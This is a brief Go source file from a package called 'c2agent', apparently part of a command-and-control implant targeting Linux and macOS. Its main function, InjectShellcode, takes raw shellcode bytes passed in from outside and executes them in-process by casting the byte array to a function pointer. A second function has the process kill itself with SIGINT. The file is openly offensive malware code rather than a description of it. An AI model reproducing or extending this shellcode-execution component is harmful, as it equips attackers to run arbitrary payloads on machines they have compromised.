// +build linux darwin

package c2agent

import (
	"syscall"
	"unsafe"
)

// InjectShellcode is called externally and passes through a byte array of raw shellcode
func InjectShellcode(sc []byte) {
	f := *(*func() int)(unsafe.Pointer(&sc[0]))
	f()
}

// Kill on Linux
func Kill() {
	syscall.Kill(syscall.Getpid(), syscall.SIGINT) // possibly derp but should work
}
